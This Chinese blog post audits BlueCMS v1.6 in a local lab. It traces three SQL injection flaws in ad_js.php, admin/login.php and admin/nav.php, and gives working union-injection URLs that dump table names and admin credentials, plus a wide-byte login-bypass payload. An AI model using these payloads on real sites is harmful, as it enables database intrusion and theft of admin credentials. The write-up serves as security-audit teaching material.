---
title: 代码审计：BlueCMS v1.6
author: 简文涛
categories:
  - Web
tags:
  - 源码审计
comments: true
top: false
summary: BlueCMS是一款专注于地方门户网站建设解决方案，基于PHP+MySQL的技术开发，全部源码开放。很适合用来源码审计
abbrlink: 56307
date: 2020-06-04 22:49:57
updated:
img: https://i.loli.net/2020/06/05/bSmYhIFJUNnVzG4.png
permalink:
---

## 环境搭建

### 源码下载地址

下载链接：https://jwt1399.lanzous.com/inPwSde6c5a

### 安装

1.把下好的`BlueCMS`源码文件`bluecms_src`放到`phpStudy`的`WWW`目录下

2.访问本地：`http://localhost/bluecms_src/`， 能看到项目文件

3.访问地址：`http://localhost/bluecms_src/uploads/install/` 就会进入到安装界面,按照提示配置好参数，注意数据库用户名和密码要与你的mysql匹配

4.再访问：`http://localhost/bluecms_src/uploads/`，可以看到已经安装好了

## SQL注入

用Seay源代码审计系统审计一下看看，我们可以发现有很多可能的注入点

![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605001712706.png)

### 注入1（Union联合注入）

**注入点：**`/ad_js.php`

#### 审计

在Seay中选中该可能的注入点，就能直接定位到该条语句了，内容如下：

![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605083807547.png)

```php
10行 require_once dirname(__FILE__) . '/include/common.inc.php';
12行 $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';
19行 $ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id);
```

包含了`/include/common.inc.php`,跟进这个文件进行查看

```php
//30行-36行
if(!get_magic_quotes_gpc())
{
	$_POST = deep_addslashes($_POST);
	$_GET = deep_addslashes($_GET);
	$_COOKIES = deep_addslashes($_COOKIES);
	$_REQUEST = deep_addslashes($_REQUEST);
}
```

> `magic_quotes_gpc`函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误

如果没有开启`gpc`，对`$_GET、$_POST、$_COOKIES、$_REQUEST`使用`deep_addslashes()`函数过滤一遍

追踪一下`deep_addslashes()`函数，在`/include/common.fun.php`中

```php
//14行-28行
function deep_addslashes($str)
{
	if(is_array($str))
	{
		foreach($str as $key=>$val)
		{
			$str[$key] = deep_addslashes($val);
		}
	}
	else
	{
		$str = addslashes($str);
	}
	return $str;
}
```

使用`addslashes`函数【在预定义字符之前添加反斜杠的字符串】对参数进行的过滤

再回看注入点，`$ad_id`没有使用单引号双引号包括所以`addslashes()`函数不起作用

```php
12行 $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';
19行 $ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id);
```

`getone()`是自定义的函数，`getone()`方法位于`/include/mysql.class.php`第`61`行，作用是`执行SQL语句并输出`

```php
function getone($sql, $type=MYSQL_ASSOC){
        $query = $this->query($sql,$this->linkid);
        $row = mysql_fetch_array($query, $type);
        return $row;
    }
```

插入到数据库查询语句中的`$ad_id`先判断参数是否为空，如果不为空再使用`trim()`函数去除首尾的空格，没有经过任何其他的过滤，因而存在`SQL`注入漏洞

还有一个有意思的点，查询结果是经过一系列判断后输出到了html的代码注释中，也就是说显示位在浏览器源码中查看

```php
38行 echo "<!--\r\ndocument.write(\"".$ad_content."\");\r\n-->\r\n";
```

#### 利用

```sql
#查看字段数
http://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 order by 7  #正常
http://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 order by 8  #报错
'''
所以字段数为7
'''

#确定显示位
http://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,7
'''
页面回显空白，查看源码看到只有7显示到界面，所以显示位在源码中，因此后面只能在源码中查看显示信息
'''

#查看数据库
view-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()
'''
得到数据库：bluetest
'''

#查看表名
view-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()
'''
得到表名：...,blue_admin,blue_admin_log,...
'''

#查看blue_admin表中字段名
view-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select  1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e
'''
这里表名blue_admin必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
得到字段：admin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip
'''

#查看admin_name和pwd字段信息
view-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin
'''
得到字段信息：admin:767708e8a5300bfe4e239b47b51659ff
'''
```

### 注入2（宽字节注入万能密码）

**注入点：**/`admin/login.php`

#### 审计

```php
22行 $admin_name = isset($_POST['admin_name']) ? trim($_POST['admin_name']) : '';
23行 $admin_pwd = isset($_POST['admin_pwd']) ? trim($_POST['admin_pwd']) : '';
```

#### 利用

```
%df'or 1=1 #
```

![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605090336244.png)

### 注入3（Union联合注入）

**注入点：** `/admin/nav.php`

#### 审计

```php
//63-70行
elseif($act=='edit')
 {
    $sql = "select * from ".table('navigate')." where navid = ".$_GET['navid'];
    $nav = $db->getone($sql);
    $smarty->assign('nav',$nav);
    $smarty->assign('act', $act );
    $smarty->display('nav_info.htm');
 }
```

`$_GET['navid']`直接接在后面，存在SQL注入漏洞

#### 利用

```sql
#查看字段数
http://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 order by 6;  #正常
http://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 order by 7;  #报错
'''
所以字段数为6
'''
```

```sql
#确定显示位
http://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2,3,4,5,6
'''
2,3,5在前端界面回显成功，因此可以在2,3,5显示位查询我们想要查询的信息
'''
```

![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605111021596.png)

```sql
#查看数据库等信息
http://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,database(),version(),4,@@version_compile_os,6
'''
得到数据库：bluetest mysql版本：5.5.53 操作系统：Win32
'''
```
![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605110818109.png)

```sql
##查看表名
http://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2, group_concat(table_name),4,5,6 from information_schema.tables where table_schema=database()
'''
得到表名：...,blue_admin,blue_admin_log,...
易错点：form语句要放在select 1,2,3,4,5,6的后面，直接放在1,2,3...的位置上得再加一个select并括起来
eg: 1 union select 1,2, (select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5,6 
'''

#查看blue_admin表中字段名
127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2, group_concat(column_name),4,5,6 from information_schema.columns where table_name=0x626c75655f61646d696e
'''
这里表名blue_admin必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
得到字段：admin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip
'''

#查看admin_name和pwd字段信息
127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2,group_concat(admin_name,0x3a,pwd),4,5,6 from blue_admin
'''
得到字段信息：admin:767708e8a5300bfe4e239b47b51659ff
'''
```

这个CMS洞太多了，给自己挖了个大坑，有空再继续写吧

## 赞助💰

如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>